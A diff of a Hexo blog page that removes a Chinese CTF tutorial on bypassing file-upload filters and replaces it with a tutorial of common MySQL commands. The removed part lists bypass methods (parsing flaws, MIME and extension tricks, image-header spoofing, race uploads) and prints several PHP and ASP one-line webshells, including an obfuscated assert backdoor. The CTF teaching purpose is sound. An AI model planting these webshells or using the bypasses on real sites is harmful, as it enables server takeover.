@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CTF文件上传绕过姿势 | Hexo</title>
-  <meta name="keywords" content=" CTF ">
-  <meta name="description" content="CTF文件上传绕过姿势 | Hexo">
+  <title>sql常用命令 | Hexo</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="sql常用命令 | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="很抱歉，您所访问的地址并不存在">
 <meta property="og:type" content="website">
@@ -260,31 +260,19 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-CTF文件上传绕过姿势" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-sql常用命令" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">CTF文件上传绕过姿势</h1>
+        <h1 class="article-title">sql常用命令</h1>
     
     <div class="article-meta">
         
         
         
-        <span class="book">
-            
-                <a  data-rel="CTF">CTF</a>
-            
-        </span>
-        
-        
-        <span class="tag">
-            
-            <a class="color4">CTF</a>
-            
-        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-05-26 18:41:25'>2020-04-29 21:58</time>
+        创建时间:<time class="date" title='更新时间: 2020-05-31 16:22:06'>2020-05-31 16:24</time>
         
     </div>
     <div class="article-meta">
@@ -306,7 +294,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前端过滤"><span class="toc-text">前端过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过js过滤"><span class="toc-text">绕过js过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#绕过方式："><span class="toc-text">绕过方式：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后端过滤"><span class="toc-text">后端过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用解析漏洞绕过"><span class="toc-text">利用解析漏洞绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS解析漏洞"><span class="toc-text">IIS解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache解析漏洞"><span class="toc-text">Apache解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nginx解析漏洞"><span class="toc-text">Nginx解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜测过滤规则绕过"><span class="toc-text">猜测过滤规则绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#文件后缀名黑名单："><span class="toc-text">文件后缀名黑名单：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MIME类型绕过"><span class="toc-text">MIME类型绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#图片马内容检测"><span class="toc-text">图片马内容检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#文件内容头检测"><span class="toc-text">文件内容头检测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他姿势"><span class="toc-text">其他姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#竞争上传"><span class="toc-text">竞争上传</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Apache的-htaccess"><span class="toc-text">Apache的.htaccess</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用一句话木马-php"><span class="toc-text">常用一句话木马(php)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attention："><span class="toc-text">Attention：</span></a></li></ol></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -322,29 +310,198 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><div class='inner-toc'><h2>目录</h2><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前端过滤"><span class="toc-text">前端过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过js过滤"><span class="toc-text">绕过js过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#绕过方式："><span class="toc-text">绕过方式：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后端过滤"><span class="toc-text">后端过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用解析漏洞绕过"><span class="toc-text">利用解析漏洞绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS解析漏洞"><span class="toc-text">IIS解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache解析漏洞"><span class="toc-text">Apache解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nginx解析漏洞"><span class="toc-text">Nginx解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜测过滤规则绕过"><span class="toc-text">猜测过滤规则绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#文件后缀名黑名单："><span class="toc-text">文件后缀名黑名单：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MIME类型绕过"><span class="toc-text">MIME类型绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#图片马内容检测"><span class="toc-text">图片马内容检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#文件内容头检测"><span class="toc-text">文件内容头检测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他姿势"><span class="toc-text">其他姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#竞争上传"><span class="toc-text">竞争上传</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Apache的-htaccess"><span class="toc-text">Apache的.htaccess</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用一句话木马-php"><span class="toc-text">常用一句话木马(php)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attention："><span class="toc-text">Attention：</span></a></li></ol></li></ol></div></p>
-<h2 id="前端过滤"><a href="#前端过滤" class="headerlink" title="前端过滤"></a>前端过滤</h2><h3 id="绕过js过滤"><a href="#绕过js过滤" class="headerlink" title="绕过js过滤"></a>绕过js过滤</h3><h4 id="绕过方式："><a href="#绕过方式：" class="headerlink" title="绕过方式："></a>绕过方式：</h4><p>1.在控制台重新定义函数 <code>function checkFile(){}</code> 回车即可(<strong>注：需要在未触发该函数前</strong>)</p>
-<p>2.将一句话木马文件后缀改为<code>.png .jpg .gif</code>后，点击上传。用<code>BurpSuite</code>截断，然后将文件名再替换成<code>.php</code></p>
-<h2 id="后端过滤"><a href="#后端过滤" class="headerlink" title="后端过滤"></a>后端过滤</h2><h3 id="利用解析漏洞绕过"><a href="#利用解析漏洞绕过" class="headerlink" title="利用解析漏洞绕过"></a>利用解析漏洞绕过</h3><h4 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h4><p>IIS 6.0在解析文件时存在以下两个解析漏洞。<br> 当建立<em>.asa、</em>.asp格式的文件夹时，其目录下的任意文件都将被IIS当做asp文件来解析。<br> 例如：建立文件夹parsing.asp，在parsing.asp文件夹内新建一个文本文档test.txt，其内容为&lt;%=NOW()%&gt;，然后在浏览器内访问。<br> “NOWO”是ASP提供获取当前时间的函数，TXT是文本文档格式，IIS是不会去解析此类文件的，应该会直接显示其内容，而在parsing.asp文件夹中，却被当作ASP脚本来解析。<br> 当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行，如：新建文件test.asp;1.jpg，内容为&lt;%=NOW()%&gt;。</p>
-<h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h4><p>Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断，如xxx.php.owf.rar ，”.owf”和”.rar”这两种后缀是apache解析不了的，apache就会把xxx.php.owf.rar解析成php。<br> 怎么去判断是不是合法的后缀就是这个漏洞利用关键，测试时把常见的后缀都写上，去测试是不是合法，任意不识别的后缀，逐级向上识别。<br> 有些程序开发人员在上传文件时，判断文件名是否是PHP、ASP、ASPX、ASA、CER、ASPX等脚本扩展名，如果是，则不允许上传，这时攻击者就有可能上传1.php.rar等扩展名来绕过程序检测，并配合解析漏洞，获取到WebShell。</p>
-<h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h4><p>解析： (任意文件名)/(任意文件名).php | (任意文件名)%00.php<br> 描述：目前Nginx主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。<br> 还有一种是对低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。</p>
-<h3 id="猜测过滤规则绕过"><a href="#猜测过滤规则绕过" class="headerlink" title="猜测过滤规则绕过"></a>猜测过滤规则绕过</h3><h4 id="文件后缀名黑名单："><a href="#文件后缀名黑名单：" class="headerlink" title="文件后缀名黑名单："></a>文件后缀名黑名单：</h4><p>​                        大小写绕过 <code>Php、PhP···</code><br>​                        利用能被解析的后缀名，例如<code>php、php3、php4、php5、php7、pht、phtml、phps</code></p>
-<h4 id="MIME类型绕过"><a href="#MIME类型绕过" class="headerlink" title="MIME类型绕过"></a>MIME类型绕过</h4><p>​                        BurpSuite<code>抓包,更改</code>content-type<code>请求头为</code>image/gif、image/png、image/jpg</p>
-<p><img src="http://cdn.sijiu.ren/blog/20200430/Bmm4AQeftwkO.bmp" alt></p>
-<h4 id="图片马内容检测"><a href="#图片马内容检测" class="headerlink" title="图片马内容检测"></a>图片马内容检测</h4><p>​                  更换一句话木马形式<code>&lt;% eval request(&quot;123&quot;)%&gt;</code>等等</p>
-<h4 id="文件内容头检测"><a href="#文件内容头检测" class="headerlink" title="文件内容头检测"></a>文件内容头检测</h4><p>上述方法均失效时可以考虑一下网站是否检测了文件头<br> 解决方法1：添加图片文件头到木马文件<br> <code>GIF89a? &lt;% eval request(&quot;123&quot;)%&gt;</code><br> 文件头对照参考：<a href="https://blog.csdn.net/rrrfff/article/details/7484109" target="_blank" rel="noopener">https://blog.csdn.net/rrrfff/article/details/7484109</a><br> 解决方法2：将一张图片与一句话木马文件结合<br> 1.记事本打开图片，在末尾或者之中添加一句话木马 2.使用命令将图片与木马文件结合,链接：<a href="https://jingyan.baidu.com/article/a65957f42c7c1224e67f9bb1.html(注：麻烦，且命令好像不对)" target="_blank" rel="noopener">https://jingyan.baidu.com/article/a65957f42c7c1224e67f9bb1.html(注：麻烦，且命令好像不对)</a></p>
-<h3 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h3><h4 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h4><p> 文件上传后，网站系统会对文件进行恶意代码检测，若是存在恶意代码，则会删除该文件 </p>
-<p> 若在这个操作的时间之内，访问该上传的文件，利用之间的时间差来获取shell</p>
-<p>user.ini<code>利用 (**注：上传目录下要有可执行的</code>php<code>文件，一般是自带的，而不是自己上传的，要是可以的话，还需要这么多骚操作干什么**)</code></p>
-<p>大佬的教程链接：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html`" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html`</a><br> 利用方式的复现地址：`<a href="https://buuoj.cn/challenges#[SUCTF%202019]CheckIn" target="_blank" rel="noopener">https://buuoj.cn/challenges#[SUCTF%202019]CheckIn</a></p>
-<h5 id="Apache的-htaccess"><a href="#Apache的-htaccess" class="headerlink" title="Apache的.htaccess"></a>Apache<code>的</code>.htaccess</h5><p>大佬的教程链接：<a href="https://www.cnblogs.com/hmbb/p/9689436.html" target="_blank" rel="noopener">https://www.cnblogs.com/hmbb/p/9689436.html</a></p>
-<h3 id="常用一句话木马-php"><a href="#常用一句话木马-php" class="headerlink" title="常用一句话木马(php)"></a>常用一句话木马(php)</h3><pre><code class="php">    GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt; 比较好用
-    &lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;
-    &lt;?php @preg_replace(&quot;/[email]/e&quot;,$_POST[‘h‘],&quot;error&quot;); ?&gt; //使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入&quot;h=@eval($_POST[c]);&quot;
-    &lt;?php $c=‘ass‘.‘ert‘;${c}($_POST[4]);?&gt;</code></pre>
-<h3 id="Attention："><a href="#Attention：" class="headerlink" title="Attention："></a>Attention：</h3><p> 一般要利用文件上传漏洞需要结合上述多种操作才行，需要灵活变通</p>
-<p>参考：<br><a href="https://www.cnblogs.com/20175211lyz/p/10989689.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/10989689.html</a><br><a href="https://www.cnblogs.com/wangtanzhi/p/12243206.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p>
-<p>转载：<a href="https://www.cnblogs.com/wjrblogs/p/12296038.html" target="_blank" rel="noopener">https://www.cnblogs.com/wjrblogs/p/12296038.html</a></p>
+        <p>零、用户管理：</p>
+<p>　　1、新建用户：</p>
+<p>　　　　&gt;CREATE USER name IDENTIFIED BY ‘ssapdrow’;</p>
+<p>　　2、更改密码：</p>
+<p>　　　　&gt;SET PASSWORD FOR name=PASSWORD(‘fdddfd’);</p>
+<p>　　3、权限管理</p>
+<p>　　　　&gt;SHOW GRANTS FOR name;    //查看name用户权限</p>
+<p>　　　　&gt;GRANT SELECT ON db_name.* TO name;　　　　//给name用户db_name数据库的所有权限</p>
+<p>　　　　&gt;REVOKE SELECT ON db_name.* TO name;　　　　//GRANT的反操作，去除权限；</p>
+<p>一、数据库操作：　</p>
+<p>　　1、查看数据库：</p>
+<p>　　　　&gt;SHOW DATABASES;</p>
+<p>　　2、创建数据库：</p>
+<p>　　　　&gt;CREATE DATABASE db_name;　　//db_name为数据库名</p>
+<p>　　3、使用数据库：</p>
+<p>　　　　&gt;USE db_name;</p>
+<p>　　4、删除数据库：</p>
+<p>　　　　&gt;DROP DATABASE db_name;</p>
+<p>二、创建表：</p>
+<p>　　1、创建表：</p>
+<p>　　　　&gt;CREATE TABLE table_name(</p>
+<p>　　　　&gt;id TINYINT UNSIGNED NOT NULL AUTO_INCREMENT,　　　　//id值，无符号、非空、递增——唯一性，可做主键。</p>
+<p>　　　　&gt;name VARCHAR(60) NOT NULL</p>
+<p>　　　　&gt;score TINYINT UNSIGNED NOT NULL DEFAULT 0,　　　　//设置默认列值</p>
+<p>　　　　&gt;PRIMARY KEY(id)</p>
+<p>　　　　&gt;)ENGINE=InnoDB　　　　//设置表的存储引擎，一般常用InnoDB和MyISAM；InnoDB可靠，支持事务；MyISAM高效不支持全文检索</p>
+<p>　　　　&gt;DEFAULT charset=utf8;　　//设置默认的编码，防止数据库中文乱码</p>
+<p>　　　　如果有条件的创建数据表还可以使用   &gt;CREATE TABLE IF NOT EXISTS tb_name(……..</p>
+<p>　　2、复制表：</p>
+<p>　　　　&gt;CREATE TABLE tb_name2 SELECT * FROM tb_name;</p>
+<p>　　　　或者部分复制：</p>
+<p>　　　　&gt;CREATE TABLE tb_name2 SELECT id,name FROM tb_name;</p>
+<p>　　3、创建临时表：</p>
+<p>　　　　&gt;CREATE TEMPORARY TABLE tb_name(这里和创建普通表一样);</p>
+<p>　　4、查看数据库中可用的表：</p>
+<p>　　　　&gt;SHOW TABLES;</p>
+<p>　　5、查看表的结构：</p>
+<p>　　　　&gt;DESCRIBE tb_name;</p>
+<p>　　　　也可以使用：</p>
+<p>　　　　&gt;SHOW COLUMNS in tb_name; 　　　　//from也可以</p>
+<p>　　6、删除表：</p>
+<p>　　　　&gt;DROP [ TEMPORARY ] TABLE [ IF EXISTS ] tb_name[ ,tb_name2…….];</p>
+<p>　　　　实例：</p>
+<p>　　　　&gt;DROP TABLE IF EXISTS tb_name;</p>
+<p>　　7、表重命名：</p>
+<p>　　　　&gt;RENAME TABLE name_old TO name_new;</p>
+<p>　　　　还可以使用：</p>
+<p>　　　　&gt;ALTER TABLE name_old RENAME name_new;</p>
+<p>三、修改表：</p>
+<p>　　1、更改表结构：</p>
+<p>　　　　&gt;ALTER TABLE tb_name ADD[CHANGE,RENAME,DROP] …要更改的内容…</p>
+<p>　　　　实例：</p>
+<p>　　　　&gt;ALTER TABLE tb_name ADD COLUMN address varchar(80) NOT NULL;</p>
+<p>　　　　&gt;ALTER TABLE tb_name DROP address;</p>
+<p>　　　　&gt;ALTER TABLE tb_name CHANGE score score SMALLINT(4) NOT NULL;</p>
+<p>四、插入数据：</p>
+<p>　　1、插入数据：</p>
+<p>　　　　&gt;INSERT INTO tb_name(id,name,score)VALUES(NULL,’张三’,140),(NULL,’张四’,178),(NULL,’张五’,134);</p>
+<p>　　　　这里的插入多条数据直接在后边加上逗号，直接写入插入的数据即可；主键id是自增的列，可以不用写。</p>
+<p>　　2、插入检索出来的数据：</p>
+<p>　　　　&gt;INSERT INTO tb_name(name,score) SELECT name,score FROM tb_name2;</p>
+<p>五、更新数据：</p>
+<p>　　1、指定更新数据：</p>
+<p>　　　　&gt;UPDATE tb_name SET score=189 WHERE id=2;</p>
+<p>　　　　&gt;UPDATE tablename SET columnName=NewValue [ WHERE condition ]</p>
+<p>六、删除数据：</p>
+<p>　　1、删除数据：</p>
+<p>　　　　&gt;DELETE FROM tb_name WHERE id=3;</p>
+<p>七、条件控制：</p>
+<p>　　1、WHERE 语句：</p>
+<p>　　　　&gt;SELECT * FROM tb_name WHERE id=3;</p>
+<p>　　2、HAVING 语句：</p>
+<p>　　　　&gt;SELECT * FROM tb_name GROUP BY score HAVING count(*)&gt;2</p>
+<p>　　3、相关条件控制符： </p>
+<p>　　　　=、&gt;、&lt;、&lt;&gt;、IN(1,2,3……)、BETWEEN a AND b、NOT</p>
+<p>　　　　AND 、OR</p>
+<p>　　　　Linke()用法中      %  为匹配任意、  _  匹配一个字符（可以是汉字）</p>
+<p>　　　　IS NULL 空值检测</p>
+<p> 八、MySQL的正则表达式：</p>
+<p>　　1、Mysql支持REGEXP的正则表达式：</p>
+<p>　　　　&gt;SELECT * FROM tb_name WHERE name REGEXP ‘^[A-D]’   //找出以A-D 为开头的name</p>
+<p>　　2、特殊字符需要转义。</p>
+<p> 九、MySQL的一些函数：</p>
+<p>　　1、字符串链接——CONCAT()</p>
+<p>　　　　&gt;SELECT CONCAT(name,’=&gt;’,score) FROM tb_name</p>
+<p>　　2、数学函数：</p>
+<p>　　　　AVG、SUM、MAX、MIN、COUNT；</p>
+<p>　　3、文本处理函数：</p>
+<p>　　　　TRIM、LOCATE、UPPER、LOWER、SUBSTRING</p>
+<p>　　4、运算符：</p>
+<p>　　　　+、-、*、\</p>
+<p>　　5、时间函数：</p>
+<p>　　　　DATE()、CURTIME()、DAY()、YEAR()、NOW()…..</p>
+<p> 十、分组查询：</p>
+<p> 　　1、分组查询可以按照指定的列进行分组：</p>
+<p>　　　　&gt;SELECT COUNT(<em>) FROM tb_name GROUP BY score HAVING COUNT(</em>)&gt;1;</p>
+<p>　　2、条件使用Having；</p>
+<p>　　3、ORDER BY 排序：</p>
+<p>　　　　ORDER BY DESC|ASC　　　　=&gt;按数据的降序和升序排列</p>
+<p>十一、UNION规则——可以执行两个语句（可以去除重复行）</p>
+<p> 十二、全文检索——MATCH和AGAINST</p>
+<p>　　1、SELECT MATCH(note_text)AGAINST(‘PICASO’) FROM tb_name;</p>
+<p>　　2、InnoDB引擎不支持全文检索，MyISAM可以；</p>
+<p> 十三、视图</p>
+<p>　　1、创建视图</p>
+<p>　　　　&gt;CREATE VIEW name AS SELECT * FROM tb_name WHERE <del>~ ORDER BY ~</del>;</p>
+<p>　　2、视图的特殊作用：</p>
+<p>　　　　　　a、简化表之间的联结（把联结写在select中）；</p>
+<p>　　　　　　b、重新格式化输出检索的数据（TRIM，CONCAT等函数）；</p>
+<p>　　　　　　c、过滤不想要的数据（select部分）</p>
+<p>　　　　　　d、使用视图计算字段值，如汇总这样的值。</p>
+<p> 十四、使用存储过程：</p>
+<p>　　个人理解，存储过程就是一个自定义函数，有局部变量参数，可传入参数，可以返回值，不过这语法够呆滞的<del>~</del></p>
+<p>　　1、创建存储过程：</p>
+<p>　　　　&gt;CREATE PROCEDURE pro(</p>
+<p>　　　　&gt;IN num INT,OUT total INT)</p>
+<p>　　　　&gt;BEGIN</p>
+<p>　　　　&gt;SELECT SUM(score) INTO total FROM tb_name WHERE id=num;</p>
+<p>　　　　&gt;END;</p>
+<p>　　　***这里的  IN (传递一个值给存储过程)，OUT（从存储过程传出一个值），INOUT（对存储过程传入、传出），INTO（保存变量）</p>
+<p>　　2、调用存储过程：</p>
+<p>　　　　&gt;CALL pro(13,@total)　　　　　　//这里的存储过程两个变量，一个是IN一个是OUT，这里的OUT也是需要写上的，不写会出错</p>
+<p>　　　　&gt;SELECT @total　　　　　　　　　//这里就可以看到结果了；</p>
+<p>　　3、存储过程的其他操作：</p>
+<p>　　　　&gt;SHOW PROCEDURE STATUS;　　　　　　//显示当期的存储过程</p>
+<p>　　　　&gt;DROP PROCEDURE pro;　　　　　　　　　//删除指定存储过程</p>
+<p>十五、使用游标：</p>
+<p>　　对这个理解不是很懂，朋友多多指点哦<del>~</del></p>
+<p>　　　1、游标的操作</p>
+<p>　　　　&gt;CREATE PROCEDURE pro()</p>
+<p>　　　　&gt;BEGIN </p>
+<p>　　　　&gt;DECLARE ordername CURSOR FOR</p>
+<p>　　　　&gt;SELECT order_num FROM orders;</p>
+<p>　　　　&gt;END;</p>
+<p>　　　　</p>
+<p>　　　　&gt;OPEN ordername;　　　　//打开游标</p>
+<p>　　　　&gt;CLOSE ordername;　　　　//关闭游标</p>
+<p>十六、触发器：</p>
+<p>　　触发器是指在进行某项指定操作时，触发触发器内指定的操作；</p>
+<p>　　1、支持触发器的语句有DELETE、INSERT、UPDATE,其他均不支持</p>
+<p>　　2、创建触发器：</p>
+<p>　　　　&gt;CREATE TRIGGER trig AFTER INSERT ON ORDERS FOR EACH ROW SELECT NEW.orser_name;</p>
+<p>　　　　&gt;INSERT语句，触发语句，返回一个值</p>
+<p>　　3、删除触发器</p>
+<p>　　　　&gt;DROP TRIGGER trig;</p>
+<p>十七、语法整理：</p>
+<p>　　1、ALTER TABLE（修改表）</p>
+<p>　　　　ALTER TABLE table_name</p>
+<p>　　　　(　　ADD　　　　column　　datatype  　　[ NULL | NOT NULL ]　　[ CONSTRAINTS ]</p>
+<p>　　　　　　 CHANGE　　column 　　datatype 　　COLUMNS　　[ NULL | NOT NULL ]　　 [ CONSTRAINTS ]</p>
+<p>　　　　　　 DROP　　　 column，</p>
+<p>　　　　　　　。。。。</p>
+<p>　　　　)</p>
+<p>　　2、COMMIT(处理事务)</p>
+<p>　　　　&gt;COMMIT;</p>
+<p> 　　3、CREATE INDEX(在一个或多个列上创建索引)</p>
+<p>　　　　CREATE INDEX index_name ON tb_name (column [ ASC | DESC ] , …….);</p>
+<p> 　　4、CREATE PROCEDURE (创建存储过程)</p>
+<p>　　　　CREATE PROCEDURE pro([ parameters ])</p>
+<p>　　　　BEGIN</p>
+<p>　　　　……..</p>
+<p>　　　　END</p>
+<p> 　　5、CREATE TABLE(创建表)</p>
+<p>　　　　CREATE TABLE tb_name(</p>
+<p>　　　　column_name　　datetype　　[ NULL | NOT NULL ] 　　[ condtraints]   ,</p>
+<p>　　　　column_name　　datetype　　[ NULL | NOT NULL ] 　　[ condtraints]   ,</p>
+<p>　　　　…….</p>
+<p>　　　　PRIMARY KEY( column_name )</p>
+<p>　　　　)ENGINE=[  InnoDB | MyiSAM ]DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;</p>
+<p> 　　6、CREATE USER(创建用户)</p>
+<p>　　　　CREATE USER user_name [ @hostname ] [ IDENTIFIED BY [ PASSWORD ] ‘pass_word’ ];</p>
+<p> 　　7、CREATE VIEW （在一个或多个表上创建视图）</p>
+<p>　　　　CREATE [ OR REPLACE ] VIEW view_name AS SELECT。。。。。。</p>
+<p> 　　8、DELETE (从表中删除一行或多行)</p>
+<p>　　　　DELETE FROM table_name [WHERE ……]</p>
+<p> 　　9、DROP(永久删除数据库及对象，如视图、索引等)</p>
+<p>　　　　DROP DATEBASE | INDEX | PROCEDURE | TABLE | TRIGGER | USER | VIEW  name</p>
+<p> 　　10、INSERT （给表添加行）</p>
+<p>　　　　INSERT INTO tb_name [ ( columns,…… ) ]  VALUES(value1,…………);</p>
+<p>　　　　使用SELECT值插入：</p>
+<p>　　　　INSERT INTO tb_name [ ( columns,…… ) ]</p>
+<p>　　　　SELECT columns , …….   FROM tb_name [ WHERE …… ] ;</p>
+<p>　　 11、ROLLBACK（撤销一个事务处理块）</p>
+<p>　　　　ROLLBACK [  TO  savapointname  ];</p>
+<p>　　 12、SAVEPOINT(为ROLLBACK设置保留点)</p>
+<p>　　　　SAVEPOINT sp1;</p>
+<p>　　 13、SELECT (检索数据，显示信息)</p>
+<p>　　　　SELECT column_name,…..FROM tb_name  [ WHERE ]   [ UNION ]    [ RROUP BY ]   [ HAVING ]   [ ORDER BY ]</p>
+<p> 　　14、START TRANSACTION (一个新的事务处理块的开始)</p>
+<p>　　　　START TRANSACTION</p>
+<p>　　 15、UPDATE(更新一个表中的一行或多行)</p>
+<p>　　　　UPDATE tb_name SET column=value,……[ where ]</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1012482327@qq.com </span>
@@ -358,12 +515,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>CTF文件上传绕过姿势</p>
+    <p><span class="copy-title">文章标题:</span>sql常用命令</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="亖 玖">亖 玖</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-04-29, 21:58:56</p>
-    <p><span class="copy-title">最后更新:</span>2020-05-26, 18:41:25</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/04/29/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" title="CTF文件上传绕过姿势">http://yoursite.com/2020/04/29/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</a>
+    <p><span class="copy-title">发布时间:</span>2020-05-31, 16:24:04</p>
+    <p><span class="copy-title">最后更新:</span>2020-05-31, 16:22:06</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/05/31/sql%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" title="sql常用命令">http://yoursite.com/2020/05/31/sql%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
